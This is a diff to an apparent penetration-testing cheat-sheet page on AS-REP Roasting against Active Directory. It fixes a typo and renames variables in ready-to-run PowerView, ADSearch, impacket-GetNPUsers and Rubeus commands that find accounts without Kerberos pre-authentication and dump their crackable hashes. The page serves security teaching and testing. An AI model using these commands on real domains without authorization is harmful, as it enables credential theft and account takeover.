@@ -19,7 +19,7 @@ permalink: /ad/asreproasting/
 
 ## Vulnerability
 
-AS-REP Roasting consists in identifying domain users that have the attribute `DONT_REQ_PREAUTH` enabled. With such an attribute, anyone can send an AS-REQ request on behalf of these users and recieve an AS-REP message. This message contains data encrypted with the user key, derived from its password. Therefore, it's possible to crack offline the password of the corresponding user.
+AS-REP Roasting consists in identifying domain users that have the attribute `DONT_REQ_PREAUTH` enabled. With such an attribute, anyone can send an AS-REQ request on behalf of these users and receive an AS-REP message. This message contains data encrypted with the user key, derived from its password. Therefore, it's possible to crack offline the password of the corresponding user.
 
 This attack can be performed without any initial domain account. Nevertheless, a domain account is needed to list domain accounts vulnerable to AS-REP Roasting. Without, you'll have to guess them.
 
@@ -41,19 +41,22 @@ Get-DomainUser -PreauthNotRequired -verbose
 
 # Using ADSearch.
 ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
+
+# Using Impacket.
+impacket-GetNPUsers -dc-ip $DomainControllerIP $DomainName/$Username:$Password
 ```
 
 If domain contains accounts vulnerable to AS-REP roasting, request the AS-REP for concerned domain users on a targeted domain controller with [Rubeus](https://github.com/GhostPack/Rubeus) or [impacket-GetNPUsers](https://github.com/fortra/impacket).
 
 ```bash
 # From Kali.
-impacket-GetNPUsers -dc-ip $dc_ip -request -outputfile hashes.asreproast $domain/$username:$password
+impacket-GetNPUsers -dc-ip $DomainControllerIP -request -outputfile hashes.asreproast $DomainName/$Username:$Password
 
 # From a domain joined computer.
 .\Rubeus.exe asreproast /outfile:hashes.asreproast /nowrap
 
 # From a Windows computer not joined to the domain.
-.\Rubeus.exe asreproast /creduser:$domain\$username /credpassword:$password /domain:$domain /dc:$dc_ip /outfile:hashes.asreproast /nowrap
+.\Rubeus.exe asreproast /creduser:$DomainName\$Username /credpassword:$Password /domain:$DomainName /dc:$DomainControllerIP /outfile:hashes.asreproast /nowrap
 ```
 
 {: .warning }
